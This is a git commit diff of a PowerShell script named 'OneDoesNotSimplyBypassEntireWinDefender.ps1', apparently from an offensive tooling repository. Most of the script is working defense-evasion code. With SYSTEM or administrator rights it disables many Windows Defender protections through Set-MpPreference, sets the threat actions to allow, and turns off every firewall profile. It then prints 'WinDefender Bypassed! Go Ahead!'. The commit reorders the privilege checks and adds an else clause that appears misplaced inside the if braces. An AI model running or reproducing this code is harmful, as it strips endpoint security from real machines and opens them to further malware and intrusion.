ddbd6524b30ef4938155e9bf902adb4bacfc642f
GєṭRєҡṭBȏʏ724/ <virusleader324@gmail.com>
2021-03-21 19:11:14 +0700

    Add files via upload

--- OneDoesNotSimplyBypassEntireWinDefender.ps1
+++ OneDoesNotSimplyBypassEntireWinDefender.ps1
@@ -12,7 +12,8 @@ function Invoke-OneDoesNotSimplyBypassEntireWinDefender {
     MPEB -BinPath "C:\Windows\explorer.exe"
     $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
     $p = New-Object System.Security.Principal.WindowsPrincipal($id)
-    if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    $username = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+    if ($username -eq "NT AUTHORITY\SYSTEM") { 
         Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction Ignore;
         Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction Ignore;
         Set-MpPreference -PUAProtection disable -ErrorAction Ignore;
@@ -32,35 +33,34 @@ function Invoke-OneDoesNotSimplyBypassEntireWinDefender {
         Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
         Start-Sleep 5
-    } else {
-        $username = [Security.Principal.WindowsIdentity]::GetCurrent().Name
-        if ($username -eq "NT AUTHORITY\SYSTEM") {
-            Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction Ignore;
-            Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction Ignore;
-            Set-MpPreference -PUAProtection disable -ErrorAction Ignore;
-            Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction Ignore;
-            Set-MpPreference -DisablePrivacyMode 1 -ErrorAction Ignore;
-            Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
-            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine 1 -ErrorAction Ignore;
-            Set-MpPreference -DisableEmailScanning 1 -ErrorAction Ignore;
-            Set-MpPreference -DisableRestorePoint 1 -ErrorAction Ignore;
-            Set-MpPreference -DisableScriptScanning 1 -ErrorAction Ignore;
-            Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction Ignore;
-            Set-MpPreference -DisableIOAVProtection 1 -ErrorAction Ignore;
-            Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
-            Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
-            Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
-            Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
-            Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
-            Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
-            Start-Sleep 5
-        } else {
-            Start-Sleep 5
-        }
+    }elseif ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction Ignore;
+        Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction Ignore;
+        Set-MpPreference -PUAProtection disable -ErrorAction Ignore;
+        Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction Ignore;
+        Set-MpPreference -DisablePrivacyMode 1 -ErrorAction Ignore;
+        Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
+        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine 1 -ErrorAction Ignore;
+        Set-MpPreference -DisableEmailScanning 1 -ErrorAction Ignore;
+        Set-MpPreference -DisableRestorePoint 1 -ErrorAction Ignore;
+        Set-MpPreference -DisableScriptScanning 1 -ErrorAction Ignore;
+        Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction Ignore;
+        Set-MpPreference -DisableIOAVProtection 1 -ErrorAction Ignore;
+        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
+        Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
+        Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
+        Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
+        Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
+        Start-Sleep 5
+    }elseif ( -not ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))) {
+        Start-Sleep 5
     }
     Write-Host "WinDefender Bypassed! Go Ahead!"
 }
 $internetconnection = Test-Connection -ComputerName google.com -Quiet
 if ($internetconnection) {
     Invoke-OneDoesNotSimplyBypassEntireWinDefender
+else {
+    throw "This shit doesnt have internet connection,We cant continue!"
 }
